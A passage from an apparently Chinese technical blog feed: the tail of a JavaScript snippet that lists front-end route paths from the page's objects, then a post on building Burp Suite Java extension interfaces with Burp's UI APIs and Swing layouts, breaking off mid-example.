class="hljs-comment">// 广度优先算法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">traverseObject</span>(<span class="hljs-params">obj, prefix = <span class="hljs-string">&#x27;&#x27;</span>, maxDepth = <span class="hljs-number">32</span></span>) &#123;<br>    <span class="hljs-keyword">let</span> pathes = [];<br>    <span class="hljs-keyword">let</span> queue = [&#123; obj, prefix, <span class="hljs-attr">depth</span>: <span class="hljs-number">0</span> &#125;];<br>    <span class="hljs-keyword">let</span> visited = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br><br>    <span class="hljs-keyword">while</span> (queue.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">let</span> &#123; obj, prefix, depth &#125; = queue.<span class="hljs-title function_">shift</span>();<br><br>        <span class="hljs-keyword">if</span> (depth &gt; maxDepth || visited.<span class="hljs-title function_">has</span>(obj)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        visited.<span class="hljs-title function_">add</span>(obj);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prop <span class="hljs-keyword">in</span> obj) &#123;<br>            <span class="hljs-keyword">let</span> newPrefix = prefix.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? prefix + <span class="hljs-string">&quot;.&quot;</span> + prop : prop;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> ([<span class="hljs-string">&#x27;parent&#x27;</span>, <span class="hljs-string">&#x27;window&#x27;</span>, <span class="hljs-string">&#x27;top&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;parentNode&#x27;</span>, <span class="hljs-string">&#x27;parentElement&#x27;</span>, <span class="hljs-string">&#x27;ownerDocument&#x27;</span>, <span class="hljs-string">&#x27;ownerElement&#x27;</span>,<br>                    <span class="hljs-string">&#x27;previousElementSibling&#x27;</span>, <span class="hljs-string">&#x27;previousSibling&#x27;</span>, <span class="hljs-string">&#x27;offsetParent&#x27;</span>,<br>                    <span class="hljs-string">&#x27;_parentVnode&#x27;</span>, <span class="hljs-string">&#x27;$parent&#x27;</span>, <span class="hljs-string">&#x27;_renderProxy&#x27;</span>, <span class="hljs-comment">// vue</span><br>                    <span class="hljs-string">&#x27;return&#x27;</span>, <span class="hljs-string">&#x27;containerInfo&#x27;</span>, <span class="hljs-string">&#x27;_debugOwner&#x27;</span>, <span class="hljs-string">&#x27;_owner&#x27;</span> <span class="hljs-comment">// react</span><br>                ].<span class="hljs-title function_">includes</span>(prop)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; obj[prop] !== <span class="hljs-literal">null</span>) &#123;<br>                    queue.<span class="hljs-title function_">push</span>(&#123; <span class="hljs-attr">obj</span>: obj[prop], <span class="hljs-attr">prefix</span>: newPrefix, <span class="hljs-attr">depth</span>: depth + <span class="hljs-number">1</span> &#125;);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&#x27;string&#x27;</span> &amp;&amp; obj[prop].<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (obj[prop].<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot; &quot;</span>) === -<span class="hljs-number">1</span> &amp;&amp; (obj[prop].<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;/&quot;</span>) === <span class="hljs-number">0</span> || newPrefix.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;route&quot;</span>) !== -<span class="hljs-number">1</span> || newPrefix.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;path&quot;</span>) !== -<span class="hljs-number">1</span>)) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newPrefix + <span class="hljs-string">&quot;: &quot;</span> + obj[prop]);<br>                        pathes.<span class="hljs-title function_">push</span>(obj[prop]);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;访问 &#x27;</span> + newPrefix + <span class="hljs-string">&#x27; 时错误: &#x27;</span> + e);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    pathes = pathes.<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">value, index, self</span>) &#123;<br>        <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">indexOf</span>(value) === index;<br>      &#125;);<br>      <br>    <span class="hljs-keyword">return</span> pathes;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">table</span>(<span class="hljs-title function_">traverseObject</span>(<span class="hljs-variable language_">document</span>));<br><br></code></pre></div></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>react-router文档：<a href="https://reactrouter.com/en/main">https://reactrouter.com/en/main</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Burpsuite Java插件开发 - UI篇</title>
    <link href="/2024/01/18/burpsuite-java-extension-ui/"/>
    <url>/2024/01/18/burpsuite-java-extension-ui/</url>
    
    <content type="html"><![CDATA[<p>对我来说，编写UI是件比较烦的事。要调布局、大小、边界、颜色之类的，调半天，界面看起来才好看点。有时还遇到组件缩成一团或字显示不全的bug，实在烦。</p><p>编写BP插件的UI，除了BurpSuite提供的几个UI API，其余的就是Java Swing知识了。</p><h2 id="BurpSuite提供的UI-API"><a href="#BurpSuite提供的UI-API" class="headerlink" title="BurpSuite提供的UI API"></a>BurpSuite提供的UI API</h2><h3 id="ITAB-和-IMessageEditor"><a href="#ITAB-和-IMessageEditor" class="headerlink" title="ITAB 和 IMessageEditor"></a>ITAB 和 IMessageEditor</h3><p>官方示例 <a href="https://github.com/PortSwigger/custom-logger/tree/master/java">CustomLogger</a> 插件，用于记录HTTP请求响应，点击对应项显示其请求包和响应包。 该插件用到了 <code>ITAB</code> 和 <code>IMessageEditor</code>这两个Burp提供的UI组件，其运行效果是：</p><p><img src="burpsuite-java-extension-ui-1.png" alt="burpsuite-java-extension-ui-1.png"></p><p>看下官方的示例代码，再自己运行一下插件，就可以知道这两个UI组件是做什么的。</p><ul><li><code>IMessageEditor</code>：通过调用<code>IBurpExtenderCallbacks</code>对象的<code>IMessageEditor createMessageEditor(IMessageEditorController controller, boolean editable)</code>方法来创建。一般创建两个<code>IMessageEditor</code>，一个用于显示请求包，一个显示响应包，跟BurpSuite Proxy面板提供的那样。<code>IMessageEditor</code>组件还需要跟<code>IMessageEditorController</code>类一起使用，该类用于返回要展示的HTTP请求和响应信息。</li><li><code>ITAB</code>：在burp顶栏多一项TAB，点击TAB标题显示自己设置的面板。通过调用 <code>IBurpExtenderCallbacks</code>对象的<code>void addSuiteTab(ITab tab)</code> 方法添加TAB。</li></ul><h3 id="IMessageEditorTab-和-ITextEditor"><a href="#IMessageEditorTab-和-ITextEditor" class="headerlink" title="IMessageEditorTab 和 ITextEditor"></a>IMessageEditorTab 和 ITextEditor</h3><p>官方示例 <a href="https://github.com/PortSwigger/example-custom-editor-tab/tree/master/java">CustomEditorTab</a> 插件，在<code>IMessageEditor</code>组件里添加一个TAB页，用于显示请求包里data参数值的base64解码结果。该插件用到了 <code>IMessageEditorTab</code> 和 <code>ITextEditor</code>。其运行效果是：</p><p><img src="burpsuite-java-extension-ui-2.png" alt="burpsuite-java-extension-ui-2.png"></p><ul><li><p><code>ITextEditor</code>：一个文本显示、编辑组件，比Java Swing内置的JTextArea文本框组件多了一些功能。支持搜索，显示行号。可通过<code>IBurpExtenderCallbacks</code>对象的<code>createTextEditor()</code>方法创建。</p></li><li><p><code>IMessageEditorTab</code>：在<code>IMessageEditor</code>组件里的TAB页。通过实现<code>IMessageEditorTabFactory</code>接口的<code>IMessageEditorTab createNewInstance(IMessageEditorController controller, boolean editable)</code>方法，该方法返回一个<code>IMessageEditorTab</code>对象，再通过调用<code>IBurpExtenderCallbacks</code>对象的<code>void registerMessageEditorTabFactory(IMessageEditorTabFactory factory)</code> 注册<code>IMessageEditorTabFactory</code>对象，就实现了在<code>IMessageEditor</code>组件里添加一个TAB页（这段话有点绕，看代码清晰些）。<code>IMessageEditorTab</code>接口的几个方法：</p><ul><li><p><code>void setMessage(byte[] content, boolean isRequest)</code>：在点击该TAB时调用。 content参数为原请求（Origin Request）或原响应（Origin Response）的完整数据。通常在这个方法里设置该TAB组件里的内容。</p></li><li><p><code>byte[] getMessage()</code>：返回值会覆盖原请求或响应内容。该方法里通常用于当用户修改了该TAB内的内容后，修改原请求或原响应的内容。</p></li><li><p><code>byte[] getSelectedData()</code>：返回当前用户所选择的数据，在该TAB里按Ctrl+C复制时调用；若返回null，则在该TAB按Ctrl + C复制的是整个包的内容。</p></li><li><p><code>boolean isModified()</code>：在点击该TAB后点击其它TAB时调用。返回true时，burp才会调用<code>byte[] getMessage()</code>方法。 若不想修改原请求或响应体的内容则返回false。</p></li><li><p><code>java.lang.String getTabCaption()</code>：返回TAB标题名</p></li><li><p><code>java.awt.Component getUiComponent()</code>：返回该TAB的UI组件</p></li><li><p><code>boolean isEnabled(byte[] content, boolean isRequest)</code>：是否显示该TAB。</p><p>Burp对<code>IMessageEditorTab</code>的几个方法的调用顺序是：</p></li></ul><ol><li>点击一个请求响应项显示<code>IMessageEditor</code>组件后，依次调用： <code>isEnabled -&gt; getUiComponent -&gt; getTabCaption</code>。 </li><li>再点击插件注册的TAB时，调用： <code>setMessage</code></li><li>再点到其他TAB时，依次调用：<code>isModified -&gt; getMessage</code></li></ol></li></ul><h3 id="IContextMenuFactory"><a href="#IContextMenuFactory" class="headerlink" title="IContextMenuFactory"></a>IContextMenuFactory</h3><p>使用<code>IContextMenuFactory</code>添加右键插件菜单。写了个示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span>, IContextMenuFactory<br>&#123;<br>    <span class="hljs-keyword">private</span> IBurpExtenderCallbacks callbacks;<br>    <span class="hljs-keyword">private</span> IExtensionHelpers helpers;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-comment">// keep a reference to our callbacks object</span><br>        <span class="hljs-built_in">this</span>.callbacks = callbacks;<br><br>        <span class="hljs-comment">// obtain an extension helpers object</span><br>        helpers = callbacks.getHelpers();<br><br>        <span class="hljs-comment">// set our extension name</span><br>        callbacks.setExtensionName(<span class="hljs-string">&quot;MenuTest&quot;</span>);<br><br>        callbacks.registerContextMenuFactory(BurpExtender.<span class="hljs-built_in">this</span>);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;JMenuItem&gt; <span class="hljs-title function_">createMenuItems</span><span class="hljs-params">(IContextMenuInvocation invocation)</span> &#123;<br>        List&lt;JMenuItem&gt; listMenuItems = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">menuItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;Sent to MenuTest&quot;</span>);<br>        menuItem.addActionListener(e -&gt; &#123;<br>            IHttpRequestResponse[] reqs = invocation.getSelectedMessages();<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            sb.append(<span class="hljs-string">&quot;what we get:\n&quot;</span>);<br>            <span class="hljs-keyword">for</span> (IHttpRequestResponse req : reqs) &#123;<br>                sb.append(<span class="hljs-string">&quot; - &quot;</span>);<br>                sb.append(helpers.analyzeRequest(req).getMethod());<br>                sb.append(<span class="hljs-string">&quot; &quot;</span>);<br>                sb.append(helpers.analyzeRequest(req).getUrl());<br>                sb.append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            callbacks.printOutput(sb.toString());<br>        &#125;);<br><br>        listMenuItems.add(menuItem);<br><br>        <span class="hljs-keyword">return</span> listMenuItems;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行效果：</p><p><img src="burpsuite-java-extension-ui-3.png" alt="burpsuite-java-extension-ui-3"></p><p>给Burp右键插件菜单添加了一项<code>Send to MenuTest</code>菜单。</p><p>关键是实现<code>IContextMenuFactory</code>接口的<code>List&lt;JMenuItem&gt; createMenuItems(IContextMenuInvocation invocation)</code>方法。每次在<code>Proxy</code>、<code>Repeater</code>、<code>Issue Activity</code>等面板点击鼠标右键的时候就会调用一次该方法。</p><p>可以通过调用<code>invocation</code>参数的<code>int getToolFlag()</code>方法获取<code>toolFlag</code>，判断用户在哪里右键的。如：</p><ul><li>在<code>Dashboard - Issue activiy</code>的<code>issue</code>列表右键，<code>toolFlag</code>值为 <code>IBurpExtenderCallbacks.TOOL_SUITE</code></li><li>在<code>Dashboard - Issue activiy</code>下方的<code>Request</code>和<code>Response</code>栏右键，则是<code>IBurpExtenderCallbacks.TOOL_SCANNER</code></li><li>在<code>Target - Contents</code>右键，是<code>IBurpExtenderCallbacks.TOOL_TARGET</code></li><li>在<code>Target - Issues</code>的<code>issue</code>列表和其下方的<code>Request</code>和<code>Response</code>栏右键，是 <code>IBurpExtenderCallbacks.TOOL_SCANNER</code>。</li><li><code>toolFlag</code>的可能值还有<code>IBurpExtenderCallbacks.TOOL_REPEATER</code>， <code>IBurpExtenderCallbacks.TOOL_PROXY</code>等，可自行翻API文档看下。</li></ul><p>也可以通过调用<code>invocation</code>参数的<code>byte getInvocationContext()</code>方法来判断用户在哪里右键的。</p><h2 id="UI辅助工具"><a href="#UI辅助工具" class="headerlink" title="UI辅助工具"></a>UI辅助工具</h2><p>使用UI辅助工具拖动组件绘制UI界面，项目编译时工具会将UI定义文件转为java代码。</p><p>由于编写Java主程序跟BP插件之间还有些不同，前者直接编译运行，后者是编译生成jar包后再通过BP去加载，加上辅助工具生成的代码不够灵活，所以开发时并没有使用这类辅助工具，只在前期学习Java Swing布局时尝试了下。</p><p>IDEA自带一个GUI Form工具。也有一个第三方的JFormDesigner插件，比GUI Form更强大，需要购买，或者30天的试用。</p><p>使用GUI Form工具将UI定义文件转为java代码：</p><ol><li>在IDEA新建一个UI定义文件，即<code>form</code>文件：<code>右键 -&gt; New -&gt; Swing UI Designer -&gt; GUI Form</code>，</li><li>修改IDEA配置：点击<code>File -&gt; Settings -&gt; Editor -&gt; GUI Designer</code>，选择<code>Java source code</code>（即将GUI Form编译为Java代码。默认是<code>Binary class files</code>，即编译为class字节码）。</li><li>点击<code>Build -&gt; Build Project</code>，在<code>form</code>文件所在的目录对应的<code>java</code>文件就能看到GUI Form生成的java代码。</li></ol><p>需要注意的是：</p><ol><li>GUI Form不支持BoxLayout、GroupLayout布局</li><li>HSpacer和VSpacer组件是IDEA提供的，不是swing库提供的。所以要写BP插件，还不好使用到这两个组件。</li></ol><p>即使辅助工具方便了UI编写，但有时将组件拖来拖去也弄不出想要的效果， 得了解一些布局的知识。</p><h2 id="Java-Swing-布局"><a href="#Java-Swing-布局" class="headerlink" title="Java Swing 布局"></a>Java Swing 布局</h2><p>官方文档： <a href="https://docs.oracle.com/javase/tutorial/uiswing/layout/index.html">https://docs.oracle.com/javase/tutorial/uiswing/layout/index.html</a> ， 官方提供的布局有8个，还可以实现自己的布局管理器。编写BP插件的UI，主要是展示数据页面和配置页面，常用的布局就三个：BorderLayout， BoxLayout，GridBagLayout。</p><h3 id="BorderLayout布局"><a href="#BorderLayout布局" class="headerlink" title="BorderLayout布局"></a><strong>BorderLayout布局</strong></h3><p>BorderLayout布局分为五个区域：上、下、左、右和中间。</p><ul><li><code>BorderLayout.NORTH</code></li><li><code>BorderLayout.SOUTH</code></li><li><code>BorderLayout.WEST</code></li><li><code>BorderLayout.EAST</code></li><li><code>BorderLayout.CENTER</code></li></ul><p>当窗口扩大时中间区域将尽可能获取更多空间，而其它区域只是占用它们需要的大小，当窗口缩小时，优先缩小的也是中间区域。一般用到该布局时，只用到中间区域（如：只放一个组件在中间区域，它尽可能占满窗口）或中间区域加上另一个区域（如：上区域放一个搜索框，中间区域放搜索结果； 中间区域放信息，下区域放“确定”，”取消“按钮）。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.blog;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BorderLayoutDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;BorderLayoutDemo&quot;</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">contentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                contentPane.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BorderLayout</span>());<br><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">textField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>();<br>                textField.setPreferredSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>( textField.getPreferredSize().width, <span class="hljs-number">30</span>));<br>                textField.setBackground(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xBB</span>));<br>                contentPane.add(textField, BorderLayout.NORTH);<br><br>                <span class="hljs-type">JTextArea</span> <span class="hljs-variable">textArea</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextArea</span>(<span class="hljs-number">20</span>, <span class="hljs-number">50</span>);<br>                textArea.setBackground(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">0x80</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xBD</span>));<br>                contentPane.add(textArea, BorderLayout.CENTER);<br><br>                frame.setContentPane(contentPane);<br>                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>                frame.pack();<br>                frame.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>效果：</p><p><img src="burpsuite-java-extension-ui-4.png" alt="burpsuite-java-extension-ui-4"></p><p>还有几点说明：</p><ol><li>若要设置四周几个块里组件的大小，不能使用<code>setMinimumSize</code>方法，要用<code>setPreferredSize</code>方法。</li><li>该布局没有提供设置每个区域之间间隔的方法。</li></ol><h3 id="BoxLayout布局"><a href="#BoxLayout布局" class="headerlink" title="BoxLayout布局"></a><strong>BoxLayout布局</strong></h3><p>BoxLayout布局是将组件沿着X轴（<code>BoxLayout.X_AXIS</code>）或Y轴（<code>BoxLayout.Y_AXIS</code>）放，可设置组件的对齐方式，如沿着Y轴放时，设置以组件的左侧或中轴线来对齐等。</p><p>通常想要组件沿着一个方向排列，只考虑一个方向上组件对齐，不考虑水平和垂直方法上都对齐时，则用BoxLayout。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.blog;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.border.EmptyBorder;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BoxLayoutDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;BoxLayoutDemo&quot;</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">contentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                contentPane.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BoxLayout</span>(contentPane, BoxLayout.X_AXIS));<br>                contentPane.setBorder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EmptyBorder</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>));<br>                contentPane.add(Box.createHorizontalGlue());<br>                contentPane.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;确认&quot;</span>));<br>                contentPane.add(Box.createHorizontalStrut(<span class="hljs-number">5</span>));<br>                contentPane.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;取消&quot;</span>));<br><br>                contentPane.setPreferredSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">560</span>, contentPane.getPreferredSize().height));<br>                frame.setContentPane(contentPane);<br>                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>                frame.pack();<br>                frame.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>效果：</p><p><img src="burpsuite-java-extension-ui-5.png" alt="burpsuite-java-extension-ui-5"></p><p>说明：</p><ol><li>BoxLayout布局里每个组件都是靠在一起的，如果要在组件之间有空隙，可以添加不可见组件（空白组件）：<ul><li>Rigid Area，固定大小的空白组件。<code>Box.createRigidArea(new Dimension(5,0))</code>。</li><li>Glue，伸展出去的空白组件。沿水平方向伸展：<code>Box.createHorizontalGlue()</code>，沿垂直方向伸展：<code>Box.createVerticalGlue()</code></li></ul></li><li>BoxLayout布局会考虑到组件的最小、期望、最大大小。通过调用组件的<code>setXxxSize</code>方法（这些方法定义在JComponnet类）来设置：<ul><li><code>comp.setMinimumSize(new Dimension(50, 25))</code>：设置最小大小</li><li><code>comp.setPreferredSize(new Dimension(50, 25))</code>：设置期望大小</li><li><code>comp.setMaximumSize(new Dimension(300, 300))</code>：设置最大大小，让组件大小不随着窗口放大而改变，或者不让它默认延展到最大</li></ul></li><li>Windows下，PowerToys工具的屏幕标尺可以测量宽高， snipaste截图工具也可以</li><li>设置布局里组件的对齐方式：通过调用各个组件的<code>setAlignmentX</code>方法和<code>setAlignmentY</code>方法来设置。</li></ol><h3 id="GridBagLayout布局"><a href="#GridBagLayout布局" class="headerlink" title="GridBagLayout布局"></a><strong>GridBagLayout布局</strong></h3><p>GridBagLayout布局将组件放在单元格里，每个组件占用一个或多个单元格，每一行可以是不同高度，每一列可以是不同宽度。</p><p>编写配置页面UI的时候通常用这个布局，代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.blog;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.border.EmptyBorder;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GridBagLayoutDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span 